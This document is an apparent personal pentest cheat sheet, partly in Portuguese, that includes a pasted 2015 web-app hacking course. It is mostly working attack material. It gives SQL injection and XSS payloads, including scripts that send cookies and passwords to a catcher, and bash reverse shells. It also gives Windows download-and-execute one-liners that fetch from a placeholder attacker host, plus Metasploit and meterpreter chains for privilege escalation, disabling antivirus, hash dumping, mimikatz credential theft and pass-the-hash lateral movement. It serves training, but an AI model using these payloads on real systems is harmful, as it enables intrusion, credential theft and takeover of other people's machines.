Fases do Pen
============
1. Targeting & Information Gathering
2. Initial Entry
3. Post-Explotation
4. Lateral Movement
5. Data Exfiltration


procurar arquivos com nomes interessantes:

c:\> dir c:\*password* /s
c:\> dir c:\*pass* /s
c:\> dir c:\*.pcf /
c:\> dir c:\*senha* /s
c:\> dir c:\*secret* /s
c:\> dir c:\*segredo* /s
c:\> dir c:\*passphrase* /s
c:\> dir c:\*competitor* /s
c:\> dir c:\*competition* /s
c:\> dir c:\*finance* /s
c:\> dir c:\*invoice* /s
c:\> dir c:\*risk* /s
c:\> dir c:\*assessment* /s
c:\> dir c:\*key* /s
c:\> dir c:\*.vbs /s
c:\> dir c:\*.pcf /s
c:\> dir c:\*.ica /s
c:\> dir c:\*.crt /s
c:\> dir c:\*.key /s
c:\> dir c:\*.log /s

search the drive and sort the files by time accessed
c:\dir c:\ /S /OD /TA

search the drive and sort the files by time created
c:\dir c:\ /S /OD /TC

search the drive and sort the files by time written
c:\dir c:\ /S /OD /TW

search the drive for files with critical data in them

c:\findstr /I /N /S /P /C:password *
c:\findstr /I /N /S /P /C:secret *
c:\findstr /I /N /S /P /C:confidential *
c:\findstr /I /N /S /P /C:account *
c:\findstr /I /N /S /P /C:payroll *
c:\findstr /I /N /S /P /C:credit *
c:\findstr /I /N /S /P /C:card *
c:\findstr /I /N /S /P /C:record *



Movimentação lateral na rede

net use \\some_workstation
cp mybin.exe \\some_workstation\c$\temp\mybin.exe
psexec \\some_workstation


Burp Suite Peoxy
================

Send all traffic to Burp Suite

all							*											Whitelist
audio						\.(ogg|mp3|wav)$							Blacklist
evsecure-ocsp.thawte.com	*evsecure-ocsp.thawte.com/*					Blacklist
facebook					*.facebook.com/*							Blacklist
images						\.(jpg|png|ico|gif|cur|svg)(\?.+|$)			Blacklist
lastpass					*|astpass.com/*								Blacklist
localhost					*://localhost/*								Blacklist
localhost number			*://127.0.0.1/*								Blacklist
mozilla.com					^https?://.*\.mozilla.com/.*$				Blacklist
mozilla.org					^https?://.*\.mozilla.org/.*$				Blacklist
OCSP thawte					http://ocsp.thawte.com/*					Blacklist
ocsp.digicert.com			*ocsp.digicert.com/*						Blacklist
ocsp.multicert.com			*ocsp.multicert.com/*						Blacklist
ocsp.verisign.com			*ocsp.verisign.com/*						Blacklist
safebrowsing				^https?://safebrowsing.*\.google\.com/.*$	Blacklist
safebrowsing SSL			^https?://sb-ssl\.google\.com/.*$			Blacklist
twitter						^https?//.*\.twitter\.com/.*$				Blacklist


# Simples Question
1) Is it talking to a DB?
   . Is there parameter passing - if yes...
   . Insert a single quote
2) Can I or someone else see what I type?
   . Is there a forum, blog, guestbook, contact us page, feedback form, instant messeger, search
   . Insert <script>alert('xss')</script>
3) Does it reference a file?
   . Is it talking about a file the local file system - if yes...
   . Insert ../../../../../../etc/passwd, ../../../../../../etc/passwd%00
   . Insert ../../../../../../windows/win.ini, ../../../../../../windows/win.ini%00

Firefox addons
--------------
showip
server-spy
foxyproxy
tamper data
firebug
webappsec

Proxy
-----
Burp Suite
Zap
Fiddler
Charles Proxy

Commercial Tools
----------------
IBM AppScan
HP WebInspect
Acunetix


https://pastebin.com/ka5PvLp8


PASTEBIN
new paste
trends API tools faq
 
Guest User
-
Public Pastes

    Untitled2 sec ago
    Untitled3 sec ago
    Untitled3 sec ago
    Untitled4 sec ago
    UntitledmIRC | 5 sec ago
    Untitled8 sec ago
    UntitledJava | 12 sec ago
    UntitledC | 15 sec ago

SHARE
TWEET
Manual Web Application Testing Basics
joemccray Aug 13th, 2015 (edited) 2,558 Never
Not a member of Pastebin yet? Sign Up, it unlocks many cool features!
rawdownloadcloneembedreportprint text 16.82 KB

###########################
# Slides for today's talk #
###########################
https://s3.amazonaws.com/StrategicSec-Files/WebAppSecIsNotEasyButCanBeSimple.pptx
 
 
########################################
# Manual Web Application Testing Day 1 #
########################################
 
This is the Day 1 morning video:
https://s3.amazonaws.com/StrategicSec-Videos/_2015_8_13_rec-hq-1_279540_recording.mp4
 
This is the Day 1 afternoon video:
https://s3.amazonaws.com/StrategicSec-Videos/_2015_8_13_rec-hq-8_279678_recording.mp4
 
The basics of web app pentesting
 
Start with simple firefox addons:
 
- ShowIP                        https://addons.mozilla.org/en-US/firefox/addon/showip/
- Server Spy                    https://addons.mozilla.org/en-US/firefox/addon/server-spy/
- FoxyProxy                     https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
- Tamper Data                   https://addons.mozilla.org/en-US/firefox/addon/tamper-data/
 
A good list of web app testing add ons for Firefox:
https://addons.mozilla.org/en-us/firefox/collections/adammuntner/webappsec/
 
 
##################################
# Basic: Web Application Testing #
##################################
 
The key to doing a Web App Assessment is to ask yourself the 3 web questions on every page in the site.
       
        1. Does the website talk to a DB?
                - Look for parameter passing (ex: site.com/page.php?id=4)
                - If yes - try SQL Injection
 
        2. Can I or someone else see what I type?
                - If yes - try XSS
 
        3. Does the page reference a file?
                - If yes - try LFI/RFI
 
Let's start with some manual testing against 54.149.82.150
 
 
Start here:
http://54.149.82.150/
 
 
There's no parameter passing on the home page so the answer to question 1 is NO.
There is however a search box in the top right of the webpage, so the answer to question 2 is YES.
 
Try an XSS in the search box on the home page:
<script>alert(123);</script>
 
Doing this gives us the following in the address bar:
http://54.149.82.150/BasicSearch.aspx?Word=<script>alert(123);</script>
 
Ok, so we've verified that there is XSS in the search box.
 
Let's move on to the search box in the left of the page.
 
Let's give the newsletter signup box a shot
 
Moving on to the login page.
http://54.149.82.150/login.aspx
 
I entered a single quote (') for both the user name and the password. I got the following error:
 
-----------------------------------------------------------------
 'Users//User[@Name=''' and @Password=''']' has an invalid token.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.
 
Exception Details: System.Xml.XPath.XPathException: 'Users//User[@Name=''' and @Password=''']' has an invalid token.
 
Source Error:
 
 
Line 112:            doc.Load(Server.MapPath("") + @"\AuthInfo.xml");
Line 113:            string credential = "Users//User[@Name='" + UserName + "' and @Password='" + Password + "']";
Line 114:            XmlNodeList xmln = doc.SelectNodes(credential);
Line 115:            //String test = xmln.ToString();            
Line 116:            if (xmln.Count > 0)
 
-----------------------------------------------------------------
 
 
Hmm....System.Xml.XPath.XPathException.....that's not SQL.
 
WTF is this:
Line 112:            doc.Load(Server.MapPath("") + @"\AuthInfo.xml");
 
 
 
 
In this case you'll have the trap the request with a proxy like:
- Firefox Tamper Data
- Burp Suite                            http://www.portswigger.net/Burp/proxy.html
- WebScarab                             https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project
- Rat Proxy                             https://code.google.com/p/ratproxy/
- Zap Proxy                             https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project
- Paros                                 http://sourceforge.net/projects/paros/
 
 
 
Let's go back to that page error message.....
 
 
Let's check it out:
http://54.149.82.150/AuthInfo.xml
 
Looks like we found passwords!!!!!!!!!!
 
 
Looks like there no significant new functionality after logging in with the stolen credentials.
 
Going back to the homepage...let's see if we can see anything. Figured I'd click on one of the links
 
 
http://54.149.82.150/bookdetail.aspx?id=2
 
 
Ok, there is parameter passing (bookdetail.aspx?id=2).
 
The page name is:               bookdetail.aspx
The parameter name is:          id
The paramber value is:          2
 
 
Let's try throwing a single quote (') in there:
 
http://54.149.82.150/bookdetail.aspx?id=2'
 
 
I get the following error:
 
Unclosed quotation mark after the character string ''.
Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.
 
Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark after the character string ''.
 
 
 
 
 
 
 
 
 
 
#############################################################################
# SQL Injection                                                             #
# https://s3.amazonaws.com/StrategicSec-Files/1-Intro_To_SQL_Intection.pptx #
#############################################################################
 
 
- Another quick way to test for SQLI is to remove the paramter value
 
 
#############################
# Error-Based SQL Injection #
#############################
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(0))--
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(1))--
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(2))--
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(3))--
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(4))--
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(N))--         NOTE: "N" - just means to keep going until you run out of databases
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85))--
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'bookmaster')--
http://54.149.82.150/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'sysdiagrams')--
 
 
 
 
#############################
# Union-Based SQL Injection #
#############################
http://54.149.82.150/bookdetail.aspx?id=2 order by 100--
http://54.149.82.150/bookdetail.aspx?id=2 order by 50--
http://54.149.82.150/bookdetail.aspx?id=2 order by 25--
http://54.149.82.150/bookdetail.aspx?id=2 order by 10--
http://54.149.82.150/bookdetail.aspx?id=2 order by 5--
http://54.149.82.150/bookdetail.aspx?id=2 order by 6--
http://54.149.82.150/bookdetail.aspx?id=2 order by 7--
http://54.149.82.150/bookdetail.aspx?id=2 order by 8--
http://54.149.82.150/bookdetail.aspx?id=2 order by 9--
http://54.149.82.150/bookdetail.aspx?id=2 union all select 1,2,3,4,5,6,7,8,9--
 
        We are using a union select statement because we are joining the developer's query with one of our own.
        Reference:
        http://www.techonthenet.com/sql/union.php
        The SQL UNION operator is used to combine the result sets of 2 or more SELECT statements.
        It removes duplicate rows between the various SELECT statements.
 
        Each SELECT statement within the UNION must have the same number of fields in the result sets with similar data types.
 
http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--
 
        Negating the paramter value (changing the id=2 to id=-2) will force the pages that will echo back data to be displayed.
 
http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
http://54.149.82.150/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--
 
 
 
 
 
- Another way is to see if you can get the backend to perform an arithmetic function
http://54.149.82.150/bookdetail.aspx?id=(2)    
http://54.149.82.150/bookdetail.aspx?id=(4-2)  
http://54.149.82.150/bookdetail.aspx?id=(4-1)
 
 
 
http://54.149.82.150/bookdetail.aspx?id=2 or 1=1--
http://54.149.82.150/bookdetail.aspx?id=2 or 1=2--
http://54.149.82.150/bookdetail.aspx?id=1*1
http://54.149.82.150/bookdetail.aspx?id=2 or 1 >-1#
http://54.149.82.150/bookdetail.aspx?id=2 or 1<99#
http://54.149.82.150/bookdetail.aspx?id=2 or 1<>1#
http://54.149.82.150/bookdetail.aspx?id=2 or 2 != 3--
http://54.149.82.150/bookdetail.aspx?id=2 &0#
 
 
 
 
 
###############################
# Blind SQL Injection Testing #
###############################
Time-Based BLIND SQL INJECTION - EXTRACT DATABASE USER
         
3 - Total Characters
http://54.149.82.150/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
http://54.149.82.150/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
http://54.149.82.150/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--          (Ok, the username is 3 chars long - it waited 10 seconds)
 
Let's go for a quick check to see if it's DBO
http://54.149.82.150/bookdetail.aspx?id=2; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'--
 
Yup, it waited 10 seconds so we know the username is 'dbo' - let's give you the syntax to verify it just for fun.
 
D  - 1st Character
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--      
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--      (Ok, first letter is a 100 which is the letter 'd' - it waited 10 seconds)
 
B - 2nd Character
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--       Ok, good it waited for 10 seconds
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--       Ok, good it waited for 10 seconds
 
O - 3rd Character
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'--       Ok, good it waited for 10 seconds
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
http://54.149.82.150/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
 
 

###################################################################
# What is XSS                                                     #
# https://s3.amazonaws.com/StrategicSec-Files/2-Intro_To_XSS.pptx #
###################################################################
 
OK - what is Cross Site Scripting (XSS)
 
1. Use Firefox to browse to the following location:
 
        http://54.186.248.116/xss_practice/
 
        A really simple search page that is vulnerable should come up.
 
 
 
 
2. In the search box type:
       
        <script>alert('So this is XSS')</script>
 
 
        This should pop-up an alert window with your message in it proving XSS is in fact possible.
        Ok, click OK and then click back and go back to http://54.186.248.116/xss_practice/
 
 
3. In the search box type:
       
        <script>alert(document.cookie)</script>
 
 
        This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
        Ok, click OK and then click back and go back to http://54.186.248.116/xss_practice/
 
4. Now replace that alert script with:
 
        <script>document.location="http://54.186.248.116/xss_practice/cookie_catcher.php?c="+document.cookie</script>
 
 
This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.
 
 
5. Now view the stolen cookie at:
        http://54.186.248.116/xss_practice/cookie_stealer_logs.html
 
 
The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.
 
 
 
 
 
 
############################
# A Better Way To Demo XSS #
############################
 
 
Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.
 
 
Use Firefox to browse to the following location:
 
        http://54.186.248.116/xss_practice/
 
 
 
Paste this in the search box
----------------------------
 
 
Option 1
--------
 
<script>
password=prompt('Your session is expired. Please enter your password to continue',' ');
document.write("<img src=\"http://54.186.248.116/xss_practice/passwordgrabber.php?password=" +password+"\">");
</script>
 
 
Now view the stolen cookie at:
        http://54.186.248.116/xss_practice/passwords.html
 
 
 
Option 2
--------
<script>
username=prompt('Please enter your username',' ');
password=prompt('Please enter your password',' ');
document.write("<img src=\"http://54.186.248.116/xss_practice/unpw_catcher.php?username="+username+"&password="+password+"\">");
</script>
 
 
 
 
Now view the stolen cookie at:
http://54.186.248.116/xss_practice/username_password_logs.html
 
 
 
 
#########################################
# Let's kick it up a notch with ASP.NET #
# http://54.200.178.220/                #
#########################################
 
 
The trading Web App is on http://54.200.178.220/
 
 
Try the following in the search box:
        <script>alert(123);</script>
        ' or 1=1
        ' and a=a
        1=1
        Joe'+OR+1=1;--
 
 
        <script>alert(123);</script>
       
Open a new tab in firefox and try this:
        http://54.200.178.220/Searchresult.aspx?<script>alert(123);</script>=ScriptName
 
 
Try the contact us form.
Open a new tab in firefox and try this:
        http://54.200.178.220/OpenPage.aspx?filename=../../../../../../windows/win.ini
 
Try this on the inquiry form:
        Joe McCray
        1234567890
        joe@strategicsec.com') waitfor delay '00:00:10'--
 
 
Login Box:
 
        ' or 1=1 or ''='
        anything                        (click login instead of pressing enter)
 
 
 
Tamper Data: (notice 2 session IDs)
 
        AcmeTrading=a4b796687b846dd4a34931d708c62b49;           SessionID is md5
        IsAdmin=yes;
        ASP.NET_SessionId=d10dlsvaq5uj1g550sotcg45
 
 
 
Profile - Detail        (tamper data)
        Disposition: form-data; name="ctl00$contentMiddle$HiddenField1"\r\n\r\njoe\r\n
        joe|set
 
 
        xss_upload.txt (Upload Bulk Order)
        <script>alert(123);</script>
 
 
 
 
############################
# Trading Web App with WAF #
# http://54.213.131.105    #
############################
 
 
Try the following in the search box:
        <script>alert(123);</script>
        <script>alert(123);</script
        <script>alert(123)
        <script>alert
        <script>
        <script
        <scrip
        <scri
        <scr
        <sc
        <s
        <p
        <
        < s
        Joe'+OR+1=1;--
 
       
Open a new tab in firefox and try this:
        http://54.213.131.105/Searchresult.aspx?%u003cscript>prompt(123)%u003c/script>=ScriptName
 
 
        xss_upload.txt (Upload Bulk Order)
        <script>alert(123);</script>
 
 
Login Box:
 
        ' or 1=1 or ''='
        anything
 
 
 
Tamper Data: (notice 2 session IDs)
 
        AcmeTrading=a4b796687b846dd4a34931d708c62b49;           SessionID is md5
        IsAdmin=yes;
        ASP.NET_SessionId=d10dlsvaq5uj1g550sotcg45
 
 
 
Profile - Detail        (tamper data)
        Disposition: form-data; name="ctl00$contentMiddle$HiddenField1"\r\n\r\njoe\r\n
        joe|set
 
 
 
 
 
 
 
###########################################################
# Attacking an Oracle/JSP based WebApp with SQL Injection #
###########################################################
 
 
 
 
 
http://54.69.156.253:8081/bookcompany/
 
 
user:   a' OR 'a'='a
pass:   a' OR 'a'='a
 
 
 
 
 
 
 
http://54.69.156.253:8081/bookcompany/author.jsp?id=111
 
 
[ Search by Username ]  Joe' OR 'a'='a
 
 
 
 
 
 
 
 
 
 
 
 
http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1
 
 
 
http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' OR '1'='1
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' or 1=utl_inaddr.get_host_address((select banner from v$version where rownum=1))--
 
 
Host is running:
 
 
 
 
 
http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' or 1=utl_inaddr.get_host_address((SELECT user FROM dual))--
 
User is:
 
 
 
 
 
http://54.69.156.253:8081/bookcompany/faq.jsp?id=111&qid=1' or 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name))--
 

    Current database is:

	
sql injection
=============

Faz conta dentro de parenteses

bookdatails.apsx?id=2
bookdatails.apsx?id=3
bookdatails.apsx?id=(2)
bookdatails.apsx?id=(3)
bookdatails.apsx?id=(5-2)
bookdatails.apsx?id=(5-3)



-=-=-=-=-=-=-=-=-=-=

Tools para dns
 
 gxfr.py
 ipcrawl
 nmap -sL 148.87.1.0-254
 dig google.com
 
Tools para Loadbalence

 lbd-0.1.sh google.com
 halbert microsoft.com
 
 Exitem 3 formas de loadbalance
 DNS loadbalance
 HTTP loadbalance
 
Tools para ver IPS/IDS/WAF
 osstmm-afd -P HTTP -t www.how2security.com.br -v 
 wafw00f http://www.site.com.br
 
 proxyfinder-0.3.pl multiproxy 10 results.txt
 
 tor &
 tor-resolve how2security.com.br
 
 proxychains nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,445,1433,1521,3306,3389,8000,8008,8080,10000 [ip|range]
 
Bash Connect Back Shell

    GnuCitizen
        Atttack Box: nc -l -p Port -vvv

        Victim: $ exec 5<>/dev/tcp/IP_Address/Port

        Victim: $ cat <&5 | while read line; do $line 2>&5 >&5; done
    Neohapsis
        Atttack Box: nc -l -p Port -vvv

        Victim: $ exec 0</dev/tcp/IP_Address/Port # First we copy our connection over stdin

        Victim: $ exec 1>&0 # Next we copy stdin to stdout

        Victim: $ exec 2>&0 # And finally stdin to stderr

        Victim: $ exec /bin/sh 0</dev/tcp/IP_Address/Port 1>&0 2>&0

 
WEB

http://pentestmokey.net

sqlmap.py -u "10.10.10.10/prod.php?id=2" -b -v 3
sqlmap.py -u "10.10.10.10/prod.php?id=2" --current-user -v 3
sqlmap.py -u "10.10.10.10/prod.php?id=2" --current-db -v 3
sqlmap.py -u "10.10.10.10/prod.php?id=2" --dbs -v 3
sqlmap.py -u "10.10.10.10/prod.php?id=2" --tables -v 3
sqlmap.py -u "10.10.10.10/prod.php?id=2" --file-read=/etc/issue -v 3
sqlmap.py -u "10.10.10.10/prod.php?id=2" --file-read=/etc/passwd -v 3
sqlmap.py -u "10.10.10.10/prod.php?id=2" --os-shell -v 3
  escolher qual a plataforma (php = 3)
  escolher caminho onde será salvo o payload (/var/www/htdoc/resume)
sqlmap.py -u "10.10.10.10/prod.php?id=2" --os-pwn --msf-path=/home/metasploit/ -v 3


msfconsole
use exploit/windows/browser/ms11_003_ie_css_import
set ExitOnSession false
set URIPATH /
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST IP
set LPORT 8080
exploit -j

msfconsole
use exploit/windows/browser/ie_cgenericelement_uaf
set ExitOnSession false
set URIPATH /
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST IP
set LPORT 8080
exploit -j

Download and execution in windows 7

cmd.exe /c "@echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://IP_Attack.com/tool/ms_exploit.exe

cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://IP_Attack.com/tool/ms_exploit.exe c:\mess.exe&start mess.exe"

cmd.exe /c "PowerShell (New-Object System.Net.WebClient).DownloadFile('http://IP_attack.com/ms_exploit.exe','mess.exe');(New-Object -com Shell.Application).ShellExecute('mess.exe')"


https://wwww.exploit-db.com/exploits/39439/
File Replication Pro <= 7.2.0 - Multiple Vulnerabilities
https://wwww.exploit-db.com/exploits/39215/
Konica Minolta FTP Utility 1.00 - CWD Command SEH Overflow

-=-=-=-=-=-=-=-=-=-

Metasploit Next Level 
###################################################
# Section 2: Actually Using Metasploit (For real) #
###################################################
 
sudo /sbin/iptables -F
 
cd ~/toolz/metasploit
 
./msfconsole
 
-------------------------------
use auxiliary/scanner/http/     (press the tab key, then press y to look through the http options)
 
 
- Here is an example:
use auxiliary/scanner/http/trace_axd
 
        - So let's do a quick google search for someone with trace.axd file
        - filetye:axd inurl:trace.axd
 
set RHOSTS 52.10.254.211
 
set VHOST endlessvacation.com
 
run
 
-------------------------------
 
 
use auxiliary/scanner/http/http_version                
 
set RHOSTS 54.69.156.253
 
set RPORT 8081
 
run
 
 
-------------------------------
 
use auxiliary/scanner/http/tomcat_enum                  
 
set RHOSTS 54.69.156.253
 
set RPORT 8081
 
run

-------------------------------
- In my opinion a much better option is a script called 'discover' from Lee Baird.
 
- You can get it here: https://github.com/leebaird/discover
 
- On the Ubuntu attack host you can run discover by typing the following:
cd ~/toolz/discover
sudo ./discover
 
 
- From here you can just follow the prompts. It will run both Nmap NSE scripts and Metasploit aux modules with all of the correct parameters for you.
 
 
##################################
# Basic Client-Side Exploitation #
##################################
 
echo j0e-r0x > /home/strategicsec/j0e-r0x.txt                   (You can of course replace j0e-r0x with yourname)
 
sudo /sbin/iptables -F
 
cd ~/toolz/metasploit
 
./msfconsole
 
use exploit/windows/browser/ie_cgenericelement_uaf
 
set ExitOnSession false
 
set URIPATH /ie8
 
set PAYLOAD windows/meterpreter/reverse_tcp
 
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
 
exploit -j
 
 
- Now from the Win7 host, use Internet Explorer 8 to connect to the exploit address (local address)
- given to you by metasploit.
 
- The address will be something like:
 
http://192.168.153.164:8080/ie8                                            (Make sure you change this to your ubuntu ip address)
 
 
 
- This will simulate a victim clicking on your malicious link and being exploited with a browser exploit.
 
 
###########################
# Client-Side Enumeration #
###########################
 
 
- You can list the active sessions by typing:
 
sessions -l
 
 
 
 
- You can "interact" with any active session by typing sessions -i 3 (replace 3 with the session number you want to interact with)
 
 
sessions -i 1
 
 
 
 
 
- You should now see Metasploit's meterpreter prompt.
 
 
********************************** Figure out who and where you are **********************************
 
meterpreter> sysinfo
 
 
meterpreter> getuid
 
 
meterpreter> ipconfig
 
 
meterpreter> run post/windows/gather/checkvm
 
 
meterpreter> run get_local_subnets
 
 
 
********************************** Escalate privileges and get hashes **********************************
 
 
meterpreter> use priv
 
 
--Option 1: GetSystem
meterpreter> getsystem
 
--Option 2:
meterpreter > run post/windows/escalate/getsystem
 
--Option 3:
meterpreter> background
back
use post/windows/escalate/droplnk
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 1234
exploit
 
--Option 4:
use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 12345
exploit
 
--Option 5:
use exploit/windows/local/service_permissions
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 5555
exploit
 
--Option 6:
use exploit/windows/local/trusted_service_path
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 4567
exploit
 
 
--Option 7:
use exploit/windows/local/ppr_flatten_rec
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7777
exploit
 
--Option 8:
use exploit/windows/local/ms_ndproxy
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7788
exploit
 
 
--Option 9:
use exploit/windows/local/ask
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.153.164                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7799
exploit
 
 
meterpreter > getuid
Server username: win7-64-victim\Workshop
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
 
--------------------------------------------------------
 
meterpreter> run killav
 
meterpreter> run post/windows/gather/hashdump
 
meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
 
meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)
 
meterpreter> run post/windows/gather/credentials/credential_collector
 
 
********************************** Steal Tokens **********************************
 
meterpreter > getsystem
 
meterpreter > use incognito
 
meterpreter > list_tokens -u
 
meterpreter > list_tokens -g
 
meterpreter > impersonate_token                         <-- choose who you want to impersonate but be sure to use 2 slashes in the name (ex: impersonate_token domain\\user)
 
meterpreter> getuid
 
 
************ Stealing credentials and certificates ************
- NOTE: Most of the stuff after 'kerberos' DOES NOT work, but is given here so you know the correct syntax to use when connected to AD or dealing with smart/CAC cards.
 
meterpreter > getsystem
 
meterpreter > load mimikatz
 
meterpreter > kerberos
 
meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
 
meterpreter > msv                                                               <-- Your AD password
 
meterpreter > livessp                                                           <-- Your Windows8 password
 
meterpreter > ssp                                                               <-- Your outlook password
 
meterpreter > tspkg                                                             <-- Your AD password
 
meterpreter > wdigest                                                           <-- Your AD password
 
meterpreter > mimikatz_command -f crypto::listStores
 
meterpreter > mimikatz_command -f crypto::listCertificates
 
meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
 
meterpreter > mimikatz_command -f crypto::patchcapi
 
meterpreter> search -d <directory> -f <file-pattern>
 
 
********************************** Enumerate the host you are on **********************************
 
meterpreter > run getcountermeasure
 
meterpreter> run winenum
 
meterpreter > run post/windows/gather/enum_applications
 
meterpreter > run post/windows/gather/enum_logged_on_users
 
meterpreter > run post/windows/gather/usb_history
 
meterpreter > run post/windows/gather/enum_shares
 
meterpreter > run post/windows/gather/enum_snmp
 
meterpreter> reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
 
 
********************************** Prove access **********************************
 
meterpreter> upload /home/strategicsec/j0e-r0x.txt c:\\
 
 
 
********************************** Lateral Movement *******************************
 
 
Now we can run the PSEXEC exploit.
-- Option 1:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass password
 
set RHOST 192.168.153.163
 
set payload windows/meterpreter/reverse_tcp
 
set LHOST 192.168.153.164
 
set LPORT 2345
 
exploit
 
 
 
 
-- Option 2:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
 
set payload windows/meterpreter/reverse_tcp
 
set RHOST 192.168.153.163                      
 
set LHOST 192.168.153.164
 
set LPORT 5678
 
exploit
 
 
#####################
# Fix broken PSExec #
#####################
- We use the shell command to get to the Victim Dos command so we can add a registry field.
 
meterpreter > execute -c -H -f cmd -a "/k" -i
reg /?
 
 
- Created a registry field to the Victim computer, this will allow us to access the machine using and exploit via PSEXEC.
 
